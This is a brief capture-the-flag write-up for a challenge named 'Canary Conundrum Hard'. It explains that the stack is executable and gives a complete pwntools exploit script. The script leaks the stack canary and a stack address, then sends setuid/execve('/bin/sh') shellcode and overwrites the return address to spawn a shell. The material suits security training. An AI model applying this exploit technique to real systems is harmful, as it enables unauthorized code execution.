![](./Canary%20Conundrum%20Hard%20(inproc)-1780625729145.webp)
inspecting the pseudo code, we acknowledge that no win function exist
![](./Canary%20Conundrum%20Hard%20(inproc)-1780625805533.webp)
checking the vmmap, we realised that the stack has execute priviledge
with that in mind, the objective of the task is to spawn a shell by pointing the return address back to our input
note that 
```
#!/usr/bin/python3

from pwn import *

context.arch="amd64"
context.os="linux"
context.log_level="debug"

def slog(name , addr):
    return success(': '.join([name, hex(addr)]))
# while True:

#     try:
#         p.sendline(b'id')
#         p.recvuntil(b'uid=' , timeout=1.5)
#         break
#     except:
#         pass
p=process("../canary-conundrum-hard")

# pause()

payload=b"REPEAT" + b"A"*(0x69-0x6)
p.recvuntil("Payload size: ")
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

zz = p.recvuntil(b"Backdoor")
dat=zz.split(b"You said: ",1)[1]
dat=dat[len(payload):]
canary=b"\x00"+dat[:7]

payload=b"REPEAT" + b"A"*(0x68-0x6+0x8)
p.recvuntil("Payload size: ")
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

zz = p.recvuntil(b"Backdoor")
dat=zz.split(b"You said: ",1)[1]
dat=dat[len(payload):]
temp=dat[:6]

addr = u64(temp + b'\x00' * 2)

# print(p64(addr))
print(hex(addr))

addr=addr-0x1f0

# print(p64(addr))
print(hex(addr))

# pause()

payload = asm("""
xor rdi, rdi
mov rax, 105
syscall
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
""")

# print(shellcraft.sh())
# payload+=b"\x00"
payload = payload.ljust(0x68)
payload += canary + b"\x20"*8 + p64(addr)
p.recvuntil("Payload size: ")
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

p.interactive()
```